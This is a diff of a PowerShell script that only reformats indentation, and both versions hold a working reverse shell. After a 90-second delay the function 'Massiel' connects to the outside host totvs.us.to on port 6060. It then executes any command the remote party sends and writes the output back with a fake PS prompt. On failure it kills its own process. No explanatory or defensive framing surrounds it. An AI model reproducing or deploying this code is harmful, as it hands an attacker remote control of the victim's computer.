@@ -1,106 +1,106 @@
 Function Massiel {
 
-        Try {
+Try {
 
-            Start-Sleep -Seconds 90
+Start-Sleep -Seconds 90
 
-            $Hosts = 'totvs.us.to'
+$Hosts = 'totvs.us.to'
 			
-            $Port = 6060
+$Port = 6060
 
-            $Clients = New-Object System.Net.Sockets.TcpClient($Hosts, $Port)
-            $Clients.NoDelay = $true
+$Clients = New-Object System.Net.Sockets.TcpClient($Hosts, $Port)
+$Clients.NoDelay = $true
 
-            $Streams = $Clients.GetStream()
+$Streams = $Clients.GetStream()
 
-            [byte[]]$Datos = [byte[]]::new(65536)
+[byte[]]$Datos = [byte[]]::new(65536)
 
-            $Bodas = [System.Text.Encoding]::UTF8.GetBytes('Ready')
+$Bodas = [System.Text.Encoding]::UTF8.GetBytes('Ready')
 
-            $Streams.Write($Bodas,0,$Bodas.Length)
+$Streams.Write($Bodas,0,$Bodas.Length)
 
-            While (($Saints = $Streams.Read($Datos, 0, $Datos.Length)) -ne 0){
+While (($Saints = $Streams.Read($Datos, 0, $Datos.Length)) -ne 0){
 
-                $Commands = [System.Text.Encoding]::UTF8.GetString($Datos, 0, $Saints)
+$Commands = [System.Text.Encoding]::UTF8.GetString($Datos, 0, $Saints)
 
-                $ErrorActionPreference = 'Stop'
+$ErrorActionPreference = 'Stop'
 
-                Try {
+Try {
 
-                    $ScriptBlocks = [ScriptBlock]::Create($Commands)
+$ScriptBlocks = [ScriptBlock]::Create($Commands)
 
-                    $Results = & $ScriptBlocks 2>&1 | Out-String
+$Results = & $ScriptBlocks 2>&1 | Out-String
 
-                 }
-                 Catch {
+}
+Catch {
 
-                    $Results = $_.Exception.Message
+$Results = $_.Exception.Message
 
-                 }
+}
 
-                 if([String]::IsNullOrWhiteSpace($Results)){
+if([String]::IsNullOrWhiteSpace($Results)){
 
-                    $Results = "[OK]"
+$Results = "[OK]"
 
-                 }
+}
 
-                 $Sends = $Results + "`r`nPS " + (pwd).Path + "> "
+$Sends = $Results + "`r`nPS " + (pwd).Path + "> "
 
-                 $SendData = [System.Text.Encoding]::UTF8.GetBytes($Sends)
+$SendData = [System.Text.Encoding]::UTF8.GetBytes($Sends)
 
-                 $Streams.Write($SendData,0,$SendData.Length)
+$Streams.Write($SendData,0,$SendData.Length)
 
-                 $Streams.Flush()
+$Streams.Flush()
 
-                 }
+}
 
-                  }
-                 Catch {
+}
+Catch {
 
-                 Start-Sleep -Seconds 30
+Start-Sleep -Seconds 30
 
-                  try {
-                   if ($Streams) {
-                       $Streams.Close()
-                       $Streams.Dispose()
-                        }
-                      }
-                     catch {}
+try {
+if ($Streams) {
+$Streams.Close()
+$Streams.Dispose()
+}
+}
+catch {}
 
-                        try {
-                       if ($Clients) {
-                           $Clients.Close()
-                           $Clients.Dispose()
-                               }
-                                 }
-                                  catch {}
+try {
+if ($Clients) {
+$Clients.Close()
+$Clients.Dispose()
+}
+}
+catch {}
 
-                                  Start-Sleep -Seconds 30
+Start-Sleep -Seconds 30
 
-                                  Write-Host "Conexion Terminada"
+Write-Host "Conexion Terminada"
 
-                                        Stop-Process -Id $PID -Force
+Stop-Process -Id $PID -Force
 
-                                        [Environment]::Exit(0)
+[Environment]::Exit(0)
 
-                                       }
-                                 Finally {
+}
+Finally {
 
-             try {
-             if ($Streams) {
-                 $Streams.Close()
-                 $Streams.Dispose()
-                }
-              }
-             catch {}
+try {
+if ($Streams) {
+$Streams.Close()
+$Streams.Dispose()
+}
+}
+catch {}
 
-             try {
-             if ($Clients) {
-                $Clients.Close()
-                $Clients.Dispose()
-             }
-          }
-          catch {}
-        }
-    }
+try {
+if ($Clients) {
+$Clients.Close()
+$Clients.Dispose()
+}
+}
+catch {}
+}
+}
 Massiel
